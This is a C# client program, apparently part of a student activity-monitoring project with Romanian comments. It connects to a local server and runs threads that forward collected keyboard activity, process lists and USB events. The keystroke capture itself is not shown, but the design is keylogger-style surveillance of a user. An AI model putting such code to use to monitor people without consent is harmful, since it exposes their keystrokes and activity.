using System;
using Newtonsoft.Json;
using System.Threading;

namespace ClientAps
{
    class Program
    {
        private static object _locker_send = new object();//deposit
        private static bool signal_stop;
        private static _backpack deposit = new _backpack();

        private static ManagerActivityClient activityClient;
        private static ManagerRequestSv managerRequestSv;

        private static ConexServer conexiune;

        private static void UpdateBackpack()
        {
            while (!signal_stop)
            {
                if(deposit.get_nr_elements()<=1)
                {
                    lock (_locker_send)
                    {
                        activityClient.sync_list(deposit);
                    }
                    Thread.Sleep(1000);//la cate 1 secunda se face update pentru backpack
                }
            }
           
        }
        
        private static void Main(string[] args)
        {
            
            conexiune = new ConexServer("127.0.0.1", 7777);//7777-port pentru pachete
                                                               //6666-interactiune cu server (asteptare request)
            //Console.WriteLine(conexiune.get_socket_client().Connected);
            while (!conexiune.get_socket_client().Connected)
            {
                conexiune = new ConexServer("127.0.0.1", 7777);
            }
            
            activityClient = new ManagerActivityClient();//Manager de activitati
            managerRequestSv = new ManagerRequestSv();//Manager de request-uri

            Thread th_sincronizare = new Thread(UpdateBackpack);//thread care face update la backpack
            th_sincronizare.Start();

            Thread th_sender = new Thread(send_packages);//thread care trimite pachetele din backpack
            th_sender.Start();
        }

        private static string parse_package_from_backpack(_package pachet)
        {
            var json = JsonConvert.SerializeObject(pachet);
            return json;
        }

        private static void send_packages()
        {
            while (!signal_stop)
            {
                if (deposit.get_nr_elements() != 0)
                {      
                        foreach (_package selectie in deposit.get_list().ToArray())//se creaza o copie
                        {
                            if (selectie.get_class().Equals("KeyboardActivity"))
                            {
                                conexiune.SendFile(selectie.get_package_inf(), selectie.get_class());

                            }else if(selectie.get_class().Equals("ProcessActivity"))
                            {
                                string json_send=parse_package_from_backpack(selectie);
                                conexiune.SendMessages(json_send,'P');

                        }else if(selectie.get_class().Equals("USB"))
                        {
                            string data_send = selectie.get_package_inf();
                            conexiune.SendMessages(data_send, 'U');
                        }
                        lock (_locker_send)
                            {
                                deposit.remove_package(selectie);
                            }
                        }
                }
                Thread.Sleep(500);
            }
        }
    }

}
